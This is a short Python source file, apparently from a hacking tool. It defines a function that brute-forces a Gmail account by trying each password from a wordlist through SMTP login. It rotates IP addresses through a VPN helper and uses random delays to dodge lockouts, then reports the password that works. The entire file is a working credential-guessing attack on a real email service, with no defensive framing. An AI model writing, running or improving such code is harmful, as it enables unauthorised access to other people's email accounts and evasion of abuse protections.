import os
import time
import random
import smtplib
from rich.console import Console
from utils.colors import Color
from utils.ui import display_ascii 
from utils.vpn import change_ip
from config import GMAIL_SMTP_SERVER, GMAIL_SMTP_PORT, RANDOM_NUMBERS, WORDLIST_DIR
from asciiart import ascii_art

console = Console()


def bruteforce(email, wordlist, vpn_enabled):
    try:
        wl_file = open(wordlist, 'r')
        wl_lines = wl_file.readlines()
    except FileNotFoundError:
        print(f"\n\nERROR 1x01:{Color.RED} wordlist not found, please insert your wordlist in 'wordlist' folder.\n\n{Color.END}")
        exit()
    
    for password in wl_lines:
        try:
            session = smtplib.SMTP(GMAIL_SMTP_SERVER, GMAIL_SMTP_PORT)
            session.starttls()
            session.login(email, password.strip())
            
            os.system("clear")
            display_ascii()
            console.print(password.strip(), justify="center", style="#13f41e bold")
            session.quit()
            exit()
            
        except Exception:
            os.system("clear")
            display_ascii()
            console.print(password.strip(), justify="center", style="#ea0408 bold")
            
            if vpn_enabled:
                change_ip()
            
            time.sleep(random.choice(RANDOM_NUMBERS))
